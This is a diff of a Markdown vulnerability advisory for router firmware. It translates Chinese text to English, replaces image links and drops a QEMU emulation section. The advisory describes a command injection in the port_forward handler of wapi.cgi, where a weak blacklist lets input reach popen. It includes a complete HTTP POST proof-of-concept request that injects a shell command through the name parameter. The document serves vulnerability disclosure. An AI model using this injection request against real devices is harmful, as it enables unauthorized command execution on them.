@@ -25,78 +25,28 @@ Upon entering the `port_forward` function (`sub_405C1C`), after passing authenti
 - `v46 = popen(v48, "r");`
   This leads to command injection.
 
-# 固件模拟
 
-```
-# qemu模拟
-qemu-system-mipsel \
-        -M malta \
-        -cpu 74Kf\
-        -kernel /home/iotsec-zone/Desktop/Tools/qemu-images/mipsel/vmlinux-3.2.0-4-4kc-malta \
-        -hda /home/iotsec-zone/Desktop/Tools/qemu-images/mipsel/debian_wheezy_mipsel_standard.qcow2 \
-        -append "root=/dev/sda1 console=ttyS0" \
-        -net nic -net tap,ifname=tap0,script=no,downscript=no \
-        -nographic
- 
- # 宿主机网卡配置
-sudo tunctl -t tap0 -u `whoami`
-sudo ifconfig tap0 192.168.10.1/24 up
+<img width="1348" height="753" alt="图片" src="https://github.com/user-attachments/assets/eeeb5934-79b6-491a-80db-30eced997df9" />
 
+After completing the initialization operations
 
-# 虚拟机网卡配置
-ip link add br0 type dummy
-ifconfig eth0 192.168.10.2/24
-ifconfig br0 192.168.10.3/24
-
-#网络配置后传输文件系统上去
-#宿主机进行压缩
-tar -cvf web.tar.gz squashfs-root/
-python -m http.server 1314
-
-#虚拟机接收并解压
-wget http://192.168.10.1:1314/web.tar.gz
-tar -xvf web.tar.gz
-
-
-# 系统环境的配置
-cd squashfs-root
-mount --bind /proc/ proc/
-mount --bind /sys/ sys/
-mount --bind /dev/ dev/
-
-
-
-chroot . sh
-./usr/sbin/uhttpd -f -h /etc/ws_web/www/ -p 0.0.0.0:8080 -x /cgi-bin -I login.html
-```
-
-![image-20260806151112363](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806151112363.png)
-
-完成初始化操作后
-
-![image-20260806151604100](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806151604100.png)
-
-# 漏洞分析
-
+<img width="1155" height="628" alt="图片" src="https://github.com/user-attachments/assets/889d576e-07b0-4e7b-bc7e-4d8a9e482013" />
 
 
 sub_405C1C
 
-检测是否登录和referer来源
+It checks whether the user is logged in and verifies the Referer source.
 
-![image-20260806153639331](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806153639331.png)
+<img width="900" height="315" alt="图片" src="https://github.com/user-attachments/assets/b51506a7-0025-4f90-84d8-f77737c1704a" />
 
-![image-20260806153717174](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806153717174.png)
+<img width="723" height="354" alt="图片" src="https://github.com/user-attachments/assets/a3a636f6-9ea9-49ea-bcb4-cce1186a9816" />
 
-![image-20260806153723077](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806153723077.png)
+<img width="707" height="371" alt="图片" src="https://github.com/user-attachments/assets/814964ba-c9ae-4005-8c35-e943b3466c14" />
 
-对传入的name进行黑名单检测但是只检测了反引号和分号
 
-![image-20260806153850199](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806153850199.png)
+Finally, the vulnerability is triggered during the execution of popen.
 
-最后触发在popen执行
-
-# 漏洞执行
+# Vulnerability exploitation
 
 ```http
 POST /cgi-bin/wapi.cgi?x=1&opt=port_forward&function=set&act=add&ip=1.1.1.1&out_port=80&in_port=80&proto=tcp&name=|%20echo%20get_shell%20>/shell HTTP/1.1
@@ -123,9 +73,8 @@ Cookie: lstatus=true; lang_sel=true; i18next=zh_CN; token=5E51163D32B247732E7795
 
 Connection: close
 ```
+First, log in to obtain a valid cookie, then send the request through Burp.
 
-先登录获取有效cookie，再发送burp即可
+<img width="1502" height="569" alt="图片" src="https://github.com/user-attachments/assets/663ea62f-28ed-4009-9a60-eaaf31a41316" />
 
-![image-20260806154218075](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806154218075.png)
-
-![image-20260806154229984](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806154229984.png)
+<img width="1306" height="460" alt="图片" src="https://github.com/user-attachments/assets/e9e697a4-dfe8-411e-8372-ccbfd967432b" />
